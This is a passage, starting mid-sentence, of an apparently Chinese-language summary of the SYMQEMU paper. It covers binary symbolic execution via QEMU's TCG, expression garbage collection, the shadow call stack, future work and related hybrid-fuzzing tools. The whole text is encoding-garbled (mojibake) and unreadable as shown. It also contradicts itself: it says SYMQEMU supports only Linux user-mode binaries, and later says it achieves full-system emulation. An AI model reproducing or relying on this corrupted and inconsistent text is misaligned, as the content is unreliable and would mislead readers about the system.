translatorsï¼Œæ¶µç›–å¤šç§å¤„ç†å™¨ç±»å‹ï¼Œå¹¶ä¸”æˆ‘ä»¬é’ˆå¯¹å…¶ä¿®æ”¹å‡ ä¹ç‹¬ç«‹äºtargetæ¶æ„ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒSYMQEMUå¯ä»¥åœ¨ç›¸å…³çš„hostæ¶æ„ä¸Šè¿è¡Œå¹¶ä¸”å¯ä»¥æ”¯æŒæ‰€æœ‰qemuèƒ½å¤Ÿå¤„ç†çš„guestæ¶æ„ä¸‹çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æã€‚ ä¸ä¹‹å‰çš„è®¾è®¡æ¯”è¾ƒ æœ¬èŠ‚ä¹‹å¤„SYMQEMUä¸æœ€å…ˆè¿›çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿçš„ä¸åŒä¹‹å¤„ã€‚ ä¸angrå’Œs2eç›¸ä¼¼ï¼ŒSYMQEMUä½¿ç”¨ä¼ ç»Ÿçš„ï¼Œä»¥IRæ¥å®Œæˆç¬¦å·æ‰§è¡Œå¤„ç†ï¼Œæ˜¾è‘—çš„é™ä½äº†å®ç°çš„å¤æ‚æ€§ã€‚ä½†æ˜¯ä¸åŒäºæ­¤äºŒè€…çš„æ˜¯ï¼Œä»–æ˜¯åŸºäºç¼–è¯‘çš„ç¬¦å·æ‰§è¡ŒæŠ€æœ¯ï¼Œæ˜¾è‘—çš„æå‡äº†æ€§èƒ½ã€‚ ä¸QSYMæ¯”è¾ƒï¼ŒSYMQEMUè®¾è®¡æœ€é‡è¦çš„ä¼˜åŠ¿æ˜¯æ¶æ„çµæ´»æ€§çš„åŒæ—¶ï¼Œèƒ½å¤Ÿç»´æŒå¾ˆé«˜çš„æ‰§è¡Œé€Ÿåº¦ã€‚åœ¨qemuä¹‹ä¸Šè¿›è¡Œè®¾è®¡ä½¿å…¶èƒ½å¤Ÿæˆ–è€…å¾ˆå¤šçš„æ•°é‡çš„æ¨¡æ‹Ÿå™¨æ”¯æŒçš„æ¶æ„å¤„ç†èƒ½åŠ›ã€‚ SYMCCè™½ç„¶ä¸èƒ½å¤Ÿåˆ†æäºŒè¿›åˆ¶ä»£ç ï¼Œä½†æ˜¯å…¶ç»™SYMQEMUæä¾›äº†åŸºäºç¼–è¯‘çš„æ€è·¯ã€‚æ­¤äºŒè€…éƒ½æ˜¯é€šè¿‡ä¿®æ”¹å…¶IRæ¥åœ¨ç›®æ ‡ç¨‹åºä¸­æ’å…¥ç¬¦å·å¤„ç†ï¼Œå¹¶ä¸”éƒ½æ˜¯å°†ç»“æœç›´æ¥ç¼–è¯‘ä¸ºèƒ½å¤Ÿé«˜æ•ˆè¿è¡Œçš„æœºå™¨ç ã€‚ç„¶è€ŒSYMCCæ˜¯é¢å‘æºä»£ç çš„ï¼Œè€ŒSYMQEMUè§£å†³äº†åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶çš„ä¸åŒæŒ‡ä»¤é›†çš„æŒ‘æˆ˜ï¼ŒSYMQEMUåœ¨ç¿»è¯‘è¿‡ç¨‹ä¸­çš„TCG opsä¸­æ’æ¡©ï¼ŒSYMCCåœ¨ç¼–ç¨‹è¿‡ç¨‹ä¸­çš„LLVM bitcodeå†…æ’æ¡©ã€‚å¹¶ä¸”SYMQEMUè§£å†³äº†guestå’Œtargetæ¶æ„ä¸åŒ¹é…çš„é—®é¢˜ã€‚ æˆ‘ä»¬è®¤ä¸ºæœ¬æ–‡å·¥ä½œç»“åˆäº†s2eä»¥åŠangrçš„ä¼˜åŠ¿ï¼Œå³å¤šæ¶æ„æ”¯æŒï¼ŒåŒæ—¶ç»“åˆäº†symccçš„ä¼˜ç‚¹ï¼Œé«˜æ€§èƒ½ï¼Œæ‘’å¼ƒäº†ä»–ä»¬çš„ç¼ºç‚¹ï¼›å¹¶ä¸”æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ç§æ–¹å¼ï¼Œèƒ½å¤Ÿå°†SYMCCçš„æ ¸å¿ƒideaåº”ç”¨åˆ°äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æä¹‹ä¸­ã€‚ å†…å­˜ç®¡ç†å½“symqemuåˆ†æè½¯ä»¶æ—¶ï¼Œä»–ä¼šå»ºç«‹å¾ˆå¤šç¬¦å·å…¬å¼æ¥æè¿°ä¸­é—´ç»“æœå’Œè·¯å¾„çº¦æŸã€‚ä»–ä»¬å ç”¨çš„å†…å­˜ä¼šéšç€æ—¶é—´è€Œä¸€ç›´å¢é•¿ï¼Œæ‰€ä»¥symqemuéœ€è¦ä¸€ç§æ–¹å¼æ¥æ¸…é™¤é‚£äº›ä¸å†è¢«ä½¿ç”¨çš„å…¬å¼ã€‚ é¦–å…ˆæˆ‘ä»¬è®¨è®ºä¸€ä¸‹ä¸ºä»€ä¹ˆå†…å­˜ç®¡ç†æ˜¯ç¬¬ä¸€ä½çš„ã€‚IRåœ¨ä»»ä½•åˆç†çš„ç¨‹åºä¸­æˆ–å¯¹ç¨‹åºæµæœ‰å½±å“ï¼Œæˆ–è€…æˆä¸ºæœ€ç»ˆç»“æœçš„ä¸€éƒ¨åˆ†ï¼›åœ¨å‰è€…æƒ…å†µä¸‹ï¼Œå¯¹åº”çš„è¡¨è¾¾å¼è¢«æ·»åŠ åˆ°è·¯å¾„çº¦æŸçš„é›†åˆä¸­ï¼Œå¹¶ä¸”ä¸èƒ½è¢«æ¸…æ¥šï¼›ä½†æ˜¯é’ˆå¯¹åè€…æƒ…å†µï¼Œè¡¨è¾¾å¼æˆä¸ºæœ€ç»ˆç»“æœçš„æè¿°ä¸­çš„å­—è¡¨è¾¾å¼ã€‚æ‰€ä»¥ç¬¦å·è¡¨è¾¾å¼æ˜¯ä»€ä¹ˆæ—¶å€™å˜æˆä¸é‡è¦çš„å‘¢ï¼Ÿå…³é”®å°±æ˜¯ç¨‹åºçš„è¾“å‡ºæ˜¯ç¨‹åºç»“æœçš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯ä»–å¯èƒ½åœ¨ç¨‹åºçš„ç»“æŸä¹‹å‰å°±å·²ç»äº§ç”Ÿäº†ã€‚ æ‰€ä»¥æˆ‘ä»¬åº”è¯¥åœ¨ç¬¦å·åœ¨æœ€åä¸€æ¬¡ä½¿ç”¨ä¹‹åå°†å…¶æ¸…é™¤ã€‚QSYMä½¿ç”¨çš„C++ smart pointsæ¥å®ç°äº†è¿™ä¸ªç›®çš„ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨è¢«ä¿®æ”¹çš„qemuä¸­ä¸èƒ½ç®€å•çš„ç›¸åŒçš„åŠæ³•ï¼šTCGæ˜¯ä¸€ä¸ªåŠ¨æ€ç¿»è¯‘å™¨ï¼Œç”±äºæ€§èƒ½å› ç´ ï¼Œå®ƒä¸äº§ç”Ÿä»»ä½•è¢«ç¿»è¯‘ä»£ç çš„æ‹“å±•åˆ†æã€‚è¿™ä½¿å¾—é«˜æ•ˆçš„ç¡®å®šæ’å…¥æ¸…é™¤ä»£ç çš„ä½ç½®éå¸¸å›°éš¾ã€‚å¹¶ä¸”ç»éªŒå‘Šè¯‰æˆ‘ä»¬ï¼Œå¤§å¤šæ•°ç¨‹åºä¸­åŒ…å«å¾ˆå°‘çš„ï¼Œåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¹‹ä¸­æ— ç”¨çš„ï¼Œç›¸å…³ç¬¦å·æ•°æ®å’Œè¡¨è¾¾å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸æƒ³æˆ‘ä»¬çš„æ¸…é™¤æœºåˆ¶é€ æˆå¾ˆå¤§çš„åŠŸè€—ã€‚ æˆ‘ä»¬ä½¿ç”¨äº†ä¸€ç§ä¹è§‚çš„æ¸…é™¤æœºåˆ¶ï¼Œåœ¨ä¸€ç§expression garbage collectorçš„åŸºç¡€ä¹‹ä¸Šï¼šSYMQEMUè·Ÿè¸ªæ‰€æœ‰ä»åç«¯è·å¾—çš„ç¬¦å·è¡¨è¾¾å¼ï¼Œå¦‚æœä»–ä»¬çš„æ•°ç›®éå¸¸å¤§æ—¶è¿›è¡Œå›æ”¶ã€‚æœ€ä¸»è¦çš„è§‚æµ‹æ˜¯æ‰€æœ‰liveè¡¨è¾¾å¼å¯ä»¥é€šè¿‡æ‰«æå¦‚ä¸‹å‘ç° æ¨¡æ‹Ÿçš„CPUç¬¦å·å¯„å­˜å™¨ å­˜å‚¨å¯¹åº”ç¬¦å·å†…å­˜ç»“æœçš„ç¬¦å·è¡¨è¾¾å¼çš„ï¼Œå†…å­˜ä¸­çš„shadow regions ä»¥ä¸Šä¸¤ç§ï¼Œåç«¯éƒ½æ˜¯å¯æ„ŸçŸ¥çš„ã€‚åœ¨æ„ŸçŸ¥åˆ°æ‰€æœ‰liveè¡¨è¾¾å¼ä¹‹åï¼Œsymqemuå°†å…¶ä¸æ‰€æœ‰å·²ç»åˆ›å»ºçš„ç¬¦å·è¡¨è¾¾å¼è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶ä¸”é‡Šæ”¾é‚£äº›ä¸å†ä½¿ç”¨çš„è¡¨è¾¾å¼ã€‚å°¤å…¶æ˜¯å½“ä¸€ä¸ªç¨‹åºåœ¨å¯„å­˜å™¨å’Œå†…å­˜ä¸­ç§»é™¤äº†è®¡ç®—çš„ç»“æœï¼Œå¯¹åº”çš„ç¬¦å·è¡¨è¾¾å¼åŒæ ·è¢«è®¤ä¸ºä¸å†ä½¿ç”¨ä¹Ÿè¢«ç§»é™¤ã€‚æˆ‘ä»¬å°† expression garbage collector å’ŒQSYMâ€™s smart pointer based memory managementç›¸è”ç³»ï¼Œè¿™ä¸¤ç§åŸºç¡€éƒ½è®¤ä¸ºè¡¨è¾¾å¼ä¸å†ä½¿ç”¨ä¹‹åå¯ä»¥è¢«é‡Šæ”¾ã€‚ ä¿®æ”¹TCG opsæˆ‘ä»¬çš„æ–¹æ³•è¦æ±‚èƒ½å¤ŸåƒTCG opsä¸­æ’æ¡©ã€‚ç„¶è€ŒTCGä¸æ”¯æŒåœ¨ç¿»è¯‘è¿‡ç¨‹ä¹‹ä¸­çš„æ‹“å±•ä¿®æ”¹åŠŸèƒ½ï¼Œä½œä¸ºä¸€ä¸ªç¿»è¯‘å™¨ï¼Œä»–é«˜åº¦å…³æ³¨é€Ÿåº¦é—®é¢˜ã€‚å› ä¸ºï¼Œå¯¹äºTCG opsçš„ç¨‹åºåŒ–ä¿®æ”¹çš„å·¥ä½œå¾ˆå°‘ã€‚ç„¶è€ŒLLVMæä¾›äº†ä¸°å¯Œçš„APIï¼Œæ”¯æŒcompileræ£€æŸ¥å’Œä¿®æ”¹LLVM bitcodeã€‚TCG opså•çº¯çš„å°†æŒ‡ä»¤å­˜å‚¨åœ¨ä¸€ä¸ªå¹³é¢é“¾è¡¨ä¸­ï¼Œè€Œæ²¡æœ‰ä»»ä½•é«˜å±‚æ¬¡çš„ç±»ä¼¼äºåŸºæœ¬å¿«çš„æ•°æ®ç»“æ„ã€‚å¹¶ä¸”ç¨‹åºæµè¢«æœŸæœ›ä¸ç¿»è¯‘å—å‘ˆçº¿æ€§å…³ç³»ã€‚ ä¸ºäº†ä¸å’ŒTCGäº§ç”Ÿä¸ä¸€è‡´ï¼Œæˆ‘ä»¬çš„å®ç°å¯¹æ¯ä¸€ä¸ªæŒ‡ä»¤ç”Ÿæˆæ—¶è¿›è¡Œç¬¦å·å¤„ç†ã€‚è™½ç„¶è¿™ç§æ–¹æ³•å¯ä»¥é¿å…ä¸TCG ä¼˜åŒ–ä»¥åŠä»£ç ç”Ÿæˆå™¨äº§ç”Ÿçš„é—®é¢˜ï¼Œä½†æ˜¯ä½¿å¾—é™æ€ä¼˜åŒ–æŠ€æœ¯ä¸å¯è¡Œï¼Œå› ä¸ºæˆ‘ä»¬æ¯æ¬¡ä»…ä»…å…³æ³¨ä¸€æ¡æŒ‡ä»¤ã€‚å°¤å…¶æ˜¯æˆ‘ä»¬æ— æ³•é™æ€ç¡®å®šç»™å®šçš„å€¼æ˜¯å¦æ˜¯å®é™…å€¼ï¼Œå¹¶ä¸”å¦‚æœæ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯ç¬¦å·å€¼çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿä¸èƒ½äº§ç”Ÿè·³è¿‡ç¬¦å·è®¡ç®—çš„é˜¶æ®µçš„è·³è½¬ã€‚ å› æ­¤æˆ‘ä»¬æœ€ç»ˆäºTCGæ‰€éœ€è¦çš„è¿è¡Œç¯å¢ƒçš„é™åˆ¶æ¡ä»¶è¾¾æˆäº†å¦¥åï¼ŒåŒæ—¶å…è®¸æˆ‘ä»¬æœ‰ç›¸å…³å¾ˆé«˜çš„æ‰§è¡Œé€Ÿåº¦ï¼šæˆ‘ä»¬åœ¨æ”¯æŒçš„è°ƒç”¨åº“ä¸­è¿›è¡Œå®é™…å€¼æ€§æ£€æŸ¥ï¼Œè¿™æ ·ï¼Œå¦‚æœå®é™…è®¡ç®—çš„è¾“å…¥éƒ½æ˜¯å‡†ç¡®å€¼çš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥è·³è¿‡ç¬¦å·å€¼è®¡ç®—ï¼Œä½†æ˜¯è¿™æ ·ä¼šå¯¼è‡´é¢å¤–çš„åº“è°ƒç”¨å¼€é”€ã€‚ shadow call stackQSYMå¼•å…¥äº†ä¸Šä¸‹æ–‡æ•æ„Ÿçš„åŸºæœ¬å¿«å‰ªæï¼Œå¦‚æœåœ¨åŒæ ·çš„è°ƒç”¨å †æ ˆç¯å¢ƒä¸­é¢‘ç¹è°ƒç”¨ç¡®å®šçš„è®¡ç®—ä¼šå¯¼è‡´å‹æŠ‘ç¬¦å·æ‰§è¡Œ(åŸºäºå¦‚ä¸‹ç›´è§‰ï¼Œåœ¨åŒæ ·çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­é‡å¤çš„æ‰§è¡Œåˆ†æå¹¶ä¸ä¼šå¯¼è‡´æ–°çš„å‘ç°)ã€‚ä¸ºäº†å®ç°è¿™ä¸ªä¼˜åŒ–ï¼Œç¬¦å·æ‰§è¡Œéœ€è¦ç»´æŠ¤ä¸€ä¸ªshadow call stackï¼Œè®°å½•è·Ÿè¸ªcallä»¥åŠreturnæŒ‡ä»¤ã€‚ åœ¨qemuåŸºç¡€ä¹‹ä¸Šï¼Œæˆ‘ä»¬é¢ä¸´ä¸€ä¸ªæ–°çš„æŒ‘æˆ˜ï¼ŒTCG opsæ˜¯ä¸€ä¸ªéå¸¸ä½çº§åˆ«çš„targetç¨‹åºçš„ä¸­é—´è¡¨ç¤ºã€‚å°¤å…¶æ˜¯ï¼Œcallä»¥åŠreturnæŒ‡ä»¤ä¸æ˜¯è¢«è¡¨ç¤ºä¸ºå•ç‹¬çš„æŒ‡ä»¤è€Œæ˜¯è¢«ç¿»è¯‘ä¸ºä¸€ç³»åˆ—TCG opsã€‚æ¯”å¦‚ä¸€ä¸ªåœ¨x86æ¶æ„ä¸‹çš„ç¨‹åºè°ƒç”¨ä¼šç”ŸæˆTCG opsï¼Œå…¶å°†è¿”å›åœ°å€pushåˆ°æ¨¡æ‹Ÿçš„stackä¸Šï¼Œè°ƒæ•´guestçš„stack pointerï¼Œå¹¶ä¸”æ ¹æ®è¢«è°ƒç”¨å‡½æ•°æ¥ä¿®æ”¹guestçš„æŒ‡ä»¤ã€‚è¿™ä½¿å¾—ä»…ä»…é€šè¿‡æ£€æµ‹TCG opsæ¥ä»¥ä¸€ä¸ªå¯é å¹¶ä¸”æ¶æ„ç‹¬ç«‹çš„æ–¹å¼æ¥è¯†åˆ«callä»¥åŠreturnæ˜¯ä¸å¯èƒ½çš„ã€‚æˆ‘ä»¬é€‰æ‹©äº†å¦‚ä¸‹ä¼˜åŒ–æ¥æé«˜é²æ£’æ€§ï¼šåœ¨æ¶æ„ç‹¬ç«‹çš„ï¼Œèƒ½å¤Ÿå°†æœºå™¨ä»£ç è½¬æ¢ä¸ºTCG opsçš„qemu ä»£ç ä¸­ï¼Œæ¯å½“é‡åˆ°callå’Œreturnæ—¶ï¼Œæˆ‘ä»¬ä¼šé€šçŸ¥ä»£ç ç”Ÿæˆå™¨ã€‚ç¼ºç‚¹å°±æ˜¯é’ˆå¯¹æ¯ä¸ªtargetæ¶æ„ï¼Œç±»ä¼¼çš„é€šçŸ¥ä»£ç éƒ½å¿…é¡»è¢«æ’å…¥åˆ°ç¿»è¯‘ä»£ç ä¸­å»ï¼Œä½†è¿™å¹¶ä¸å¤æ‚ã€‚ è¯„ä»·è¯¦è§åŸæ–‡ï¼Œä¸»è¦æ˜¯ä¸€äº›æŒ‡æ ‡ä¸æµ‹è¯•æ•ˆæœ æœªæ¥å·¥ä½œå…¨ç³»ç»Ÿä»¿çœŸSYMQEMUç›®å‰è¿è¡Œç¬¦å·æ‰§è¡Œé’ˆå¯¹linuxç”¨æˆ·æ€äºŒè¿›åˆ¶ç¨‹åºï¼Œä¹‹åå°†ä¼šå¯¹å…¶æ‹“å±•åˆ°å…¨ç³»ç»Ÿåˆ†æï¼Œå°¤å…¶æ˜¯é’ˆå¯¹åµŒå…¥å¼è®¾å¤‡è€Œè¨€ï¼Œåˆ†ææ­¤ç±»ç¨‹åºè¦æ±‚å…¨ç³»ç»Ÿä»¿çœŸã€‚ æˆ‘ä»¬è®¤ä¸ºåœ¨SYMQEMUå®ç°è¿™ä¸€æ”¹è¿›æ˜¯å¯èƒ½çš„ã€‚å°†targetç¿»è¯‘ä¸ºTCG opsï¼Œå¯¹å…¶æ’æ¡©ï¼Œå¹¶å°†å…¶ç¼–è¯‘ä¸ºæœºå™¨ç ï¼Œè¿™äº›åŸºæœ¬è¿‡ç¨‹ä¸æ”¹å˜ã€‚éœ€è¦æ·»åŠ çš„ä¸€ä¸ªæœºåˆ¶æ˜¯å°†ç¬¦å·åŒ–æ•°æ®å¼•å…¥åˆ°guestç³»ç»Ÿä¸­ï¼Œè¿™æ˜¯å—åˆ°S2E fake-instructionæŠ€æœ¯çš„å¯å‘ï¼Œä»¥åŠå½“åœ¨guestå†…å­˜ä»¥åŠç¬¦å·è¡¨è¾¾å¼ä¹‹é—´å­˜åœ¨æ˜ å°„æ—¶ï¼Œshadow-memoryç³»ç»Ÿéœ€è¦è®°å½•è™šæ‹ŸMMUçš„æ•°é‡ã€‚æœ€ç»ˆå°†ä¼šäº§ç”Ÿä¸€ä¸ªä¸ä»…å¯ä»¥å¯¹ç”¨æˆ·æ€ç¨‹åºè¿›è¡Œæµ‹è¯•ï¼ŒåŒæ ·å¯ä»¥å¯¹å†…æ ¸ä»£ç è¿›è¡Œæµ‹è¯•çš„ç³»ç»Ÿï¼Œå¹¶ä¸”å…¶åŒæ ·å¯åˆ†æélinuxç³»ç»Ÿçš„ä»£ç ä»¥åŠè£¸å›ºä»¶ç­‰ã€‚ caching across executionsæ··åˆfuzzingæŠ€æœ¯çš„ç‰¹ç‚¹ä¹‹ä¸€æ˜¯èƒ½å¤Ÿå¯¹åŒä¸€ç¨‹åºè¿›è¡Œå¤§é‡çš„è¿ç»­æ‰§è¡Œã€‚ä½œä¸ºåŠ¨æ€ç¿»è¯‘å™¨ï¼ŒSYMQEMUåœ¨è¿è¡Œæ€æŒ‰éœ€ç¿»è¯‘targetç¨‹åºã€‚å¹¶ä¸”ç¿»è¯‘çš„ç»“æœåœ¨å•ä¸ªè¿è¡Œçš„è¿‡ç¨‹ä¹‹ä¸­è¢«ç¼“å­˜ï¼Œä½†æ˜¯å½“ç›®æ ‡ç¨‹åºæ‰§è¡Œç»ˆæ­¢æ—¶è¿™äº›ç¼“å­˜ç»“æœä¼šè¢«ä¸¢å¼ƒã€‚æˆ‘ä»¬çŒœæƒ³ï¼Œå¯ä»¥é€šè¿‡ç¼“å­˜å¤šä¸ªæ‰§è¡Œè¿‡ç¨‹ä¸­çš„ç¿»è¯‘ç»“æœï¼Œå¯ä»¥æ˜¾è‘—æå‡ç»“åˆSYMQEMUçš„æ··åˆFUZZçš„æ€§èƒ½ã€‚ä¸»è¦çš„æŒ‘æˆ˜å°±æ˜¯éœ€è¦ç¡®å®šç›®æ ‡æ˜¯ç¡®å®šæ€§åŠ è½½çš„ï¼Œä»¥åŠé’ˆå¯¹è‡ªæˆ‘ä¿®æ”¹ä»£ç éœ€è¦è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚æ‰€ä»¥ï¼Œè¿™äº›æ½œåœ¨çš„ä¼˜åŒ–æ€§èƒ½æå‡ä¸»è¦åœ¨äºè¢«æµ‹ç¨‹åºçš„ç‰¹ç‚¹ã€‚ symbolic QEMU helpersQEMUåˆ©ç”¨TCG opsè¡¨ç¤ºæœºå™¨ç ï¼Œç„¶è€Œä¸€äº›targetçš„æŒ‡ä»¤éš¾ä»¥ç”¨TCG opsæ¥è¿›è¡Œè¡¨ç¤ºï¼Œå°¤å…¶æ˜¯åœ¨CISCæ¶æ„ä¹‹ä¸Šã€‚é’ˆå¯¹è¿™æƒ…å†µï¼ŒQEMUä½¿ç”¨helpers:å¯ä»¥è¢«TCGè°ƒç”¨çš„å†…ç½®å˜å¼‚å‡½æ•°ï¼Œä»¿çœŸtargetæ¶æ„çš„æ¯ä¸€ä¸ªå¤æ‚æŒ‡ä»¤ã€‚ç”±äºhelperså·¥ä½œåœ¨å¸¸è§„çš„TCGæ¶æ„ä¹‹å¤–ï¼ŒSYMQEMUåœ¨TCGå±‚çº§çš„æ’æ¡©ä¸èƒ½æ’å…¥ç¬¦å·å¤„ç†åˆ°ä»–ä»¬ä¹‹ä¸­ã€‚è¿™æ ·çš„ç»“æœæ˜¯implicit concretizationï¼Œåœ¨åˆ†æä½¿ç”¨å¤§é‡ç›®æ ‡çš„æŒ‡ä»¤æ—¶ä¼šäº§ç”Ÿç²¾è¯»æŸå¤±ã€‚ æˆ‘ä»¬æœ‰å¦‚ä¸‹ä¸¤ç§å®ç°qemu helpersç¬¦å·å¤„ç†çš„æ–¹å¼ï¼š ç¬¬ä¸€ç§æ–¹å¼æ˜¯ä¸ºæ¯ä¸€ä¸ªè¦æ±‚çš„helperæ‰‹åŠ¨æ·»åŠ ç¬¦å·ç­‰ä»·å¼ï¼Œæ›´åƒåœ¨ä¸€äº›ç¬¦å·æ‰§è¡Œå¼•æ“ä¸­ä½¿ç”¨çš„å¸¸ç”¨libcåŠŸèƒ½çš„å‡½æ•°æ€»ç»“ã€‚è¿™ä¸ªæ–¹å¼éå¸¸å®¹æ˜“å®ç°ï¼Œä½†æ˜¯ä¸æ–¹ä¾¿åº”ç”¨äºå¤§æ•°é‡çš„helpersä¸­ã€‚ å¦ä¸€ç§æ–¹å¼æ˜¯è‡ªåŠ¨åŒ–çš„å®ç°helpersçš„ç¬¦å·åŒ–ç‰ˆæœ¬ã€‚ä¸ºäº†å®ç°è¿™ä¸ªç›®çš„ï¼ŒSYMCCå¯ä»¥è¢«ç”¨æ¥ç¼–è¯‘ç¬¦å·åŒ–è¿½è¸ªåˆ°helpersä¸­ï¼Œä»–çš„æºä»£ç ä½œä¸ºQEMUçš„ä¸€éƒ¨åˆ†æ˜¯å…¬å¼€çš„ã€‚æœ€ç»ˆå¾—åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å’ŒSYMQEMUå…¼å®¹çš„ï¼Œå› ä¸ºSYMCCçš„ä½¿ç”¨ç›¸åŒçš„ç¬¦å·æ¨ç†çš„åç«¯ã€‚S2Eä¹Ÿæ˜¯ä½¿ç”¨ç±»ä¼¼çš„æ–¹å¼ç¼–è¯‘helpersåˆ°KLEEä¸­çš„è§£é‡Šå™¨ä¸­çš„LLVM bitcodeã€‚ ç›¸å…³å·¥ä½œbinary-onlyç¬¦å·æ‰§è¡ŒMayhemæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„åŸºäºè§£é‡Šå™¨çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œèµ¢å¾—è¿‡DAPRA CGCæ¯”èµ›ï¼Œç„¶è€Œç”±äºå…¶ä¸å¼€æºæ— æ³•æ¯”è¾ƒæ€§èƒ½ã€‚Tritonæ˜¯å¯ä»¥ä»¥ä¸¤ç§æ–¹å¼è¿è¡Œçš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œä¸€ç§ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶è½¬æ¢ï¼Œç±»ä¼¼äºQSYMï¼Œä¸€ç§ä½¿ç”¨CPUä»¿çœŸï¼Œç±»ä¼¼äºS2Eä»¥åŠangrã€‚Eclipserè¦†ç›–äº†ä»‹äºfuzzingå’Œç¬¦å·æ‰§è¡Œä¹‹é—´çš„ä¸€äº›ä¸­é—´åŒºåŸŸï¼Œä»–è®¤ä¸ºåœ¨åˆ†æ”¯æ¡ä»¶å’Œè¾“å…¥æ•°æ®ä¹‹é—´å­˜åœ¨çº¿æ€§å…³ç³»ã€‚è¿™ç§çº¦æŸçš„ç®€åŒ–æå‡äº†ç³»ç»Ÿçš„æ€§èƒ½ï¼Œç„¶è€Œä»–å´ä¸èƒ½å‘ç°å¸¸è§„ç¬¦å·æ‰§è¡Œç³»ç»Ÿå¯ä»¥å‘ç°çš„é‚£äº›è·¯å¾„ã€‚Redqueenåˆ©ç”¨ä¸€ç§å¯å‘å¼çš„æ–¹æ³•å¯»æ‰¾è·¯å¾„æ¡ä»¶å’Œè¾“å…¥ä¹‹é—´çš„å…³ç³»ã€‚SYMQEMUç›¸æ¯”è¾ƒæ¥è¯´å®ç°äº†å…¨ç³»ç»Ÿä»¿çœŸã€‚ è¿è¡Œæ€bugæ£€æµ‹æ··åˆfuzzingä¾é fuzzerä»¥åŠsanitizersæ¥æ£€æµ‹bugsã€‚Address sanitizeræ˜¯ä¸€ç§æµè¡Œçš„ç”¨æ¥æ£€æµ‹ç¡®å®šå†…å­˜é”™è¯¯çš„sanitizerã€‚ç”±äºå…¶éœ€è¦æºä»£ç æ¥äº§ç”Ÿæ’æ¡©ç¨‹åºï¼Œ Fioraldi et alè®¾è®¡äº†QASanï¼ŒåŸºäºqemuçš„ç³»ç»Ÿæ¥å¯¹äºŒè¿›åˆ¶æ–‡ä»¶å®ç°ç±»ä¼¼çš„æ£€æµ‹ã€‚æœ‰å¤§é‡çš„éœ€è¦æºä»£ç çš„sanitizersã€‚æˆ‘ä»¬æ¨æµ‹é€šè¿‡QASançš„æ€è·¯ï¼Œå¯ä»¥å°†å¤§é‡ä¸Šè¿°sanitizersç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶åˆ†æã€‚ æ··åˆfuzzingDrilleræ˜¯åŸºäºangrçš„æ··åˆfuzzerï¼Œå…¶è®¾è®¡ç†å¿µç±»ä¼¼äºQSYMï¼Œä½†æ˜¯æœ‰å…¶angrçš„pythonå®ç°ä»¥åŠåŸºäºè§£é‡Šå™¨çš„æ–¹å¼ï¼Œå…¶æ‰§è¡Œé€Ÿåº¦è¾ƒä½ã€‚ä¸QSYMä»¥åŠSYMQEMUæ¯”è¾ƒï¼Œå®ƒä½¿ç”¨äº†ä¸€ç§æ›´åŠ ç²¾ç»†çš„ç­–ç•¥æ¥èåˆfuzzerä»¥åŠç¬¦å·å¼•æ“ï¼šä»–ç›‘æ§fuzzerçš„è¿›å±•æƒ…å†µï¼Œå¹¶ä¸”å½“å…¶ä¼¼ä¹é‡åˆ°è‡ªèº«æ— æ³•è§£å†³çš„éšœç¢æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°ç¬¦å·æ‰§è¡Œã€‚ç±»ä¼¼çš„ï¼Œæœ€è¿‘æå‡ºçš„Pangoliné€šè¿‡ä¸ä»…æä¾›fuzzeræµ‹è¯•ç”¨ä¾‹ï¼Œä»¥åŠä¸€äº›æŠ½è±¡çš„ç¬¦å·çº¦æŸï¼Œè¿˜æœ‰å¿«é€Ÿæ ·æœ¬ç”Ÿæˆæ–¹æ³•ï¼Œå¼ºè°ƒäº†fuzzerç»“åˆç¬¦å·æ‰§è¡Œçš„ä¼˜åŠ¿ï¼›åˆ©ç”¨è¿™äº›ï¼Œfuzzerèƒ½å¤Ÿç”Ÿæˆå¯ä»¥æœ‰å¾ˆå¤§æ¦‚ç‡è§£å†³ç”±ç¬¦å·æ‰§è¡Œç”Ÿæˆçš„è·¯å¾„çº¦æŸçš„è¾“å…¥ã€‚ æˆ‘ä»¬è®¤ä¸ºæ›´åŠ ç²¾ç»†çš„ç¬¦å·æ‰§è¡Œå’Œfuzzerçš„ç»„åˆå¯ä»¥å¾ˆå¤§ç¨‹åº¦ä¸Šæå‡æ··åˆfuzzingçš„æ€§èƒ½ã€‚ æ€»ç»“æˆ‘ä»¬æå‡ºäº†SYMQEMUï¼Œä¸€ç§åŸºäºç¼–è¯‘çš„ï¼Œé’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·æ‰§è¡Œå¼•æ“ã€‚æˆ‘ä»¬çš„è¯„ä»·å±•ç¤ºäº†SYMQEMUæ€§èƒ½ä¼˜äºæœ€å…ˆè¿›çš„ç¬¦å·æ‰§è¡Œå¼•æ“å¹¶ä¸”å¯ä»¥åœ¨æŸäº›æ–¹é¢ä¸åŸºäºæºä»£ç çš„ç¬¦å·æ‰§è¡ŒæŠ€æœ¯ç›¸åŒ¹é…ã€‚è€Œä¸”SYMQEMUéå¸¸æ–¹ä¾¿çš„å‘å…¶ä»–æ¶æ„è¿›è¡Œè¿ç§»ï¼Œåªéœ€è¦å‡ è¡Œä»£ç 